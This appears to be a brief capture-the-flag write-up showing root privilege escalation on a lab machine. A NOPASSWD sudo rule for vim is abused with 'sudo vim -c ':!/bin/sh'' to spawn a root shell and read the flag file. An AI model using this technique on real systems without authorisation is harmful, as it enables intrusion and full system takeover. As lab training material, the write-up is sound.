# Privilege Esc via Sudo Misconfiguration (Vim Abuse)

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```bash
 sudo vim -c ':!/bin/sh'
```

```bash
# ls /root
root.txt
# ls
LinEnum.sh  user.txt
# cat /root/root.txt
W3ll d0n3. You made it!
```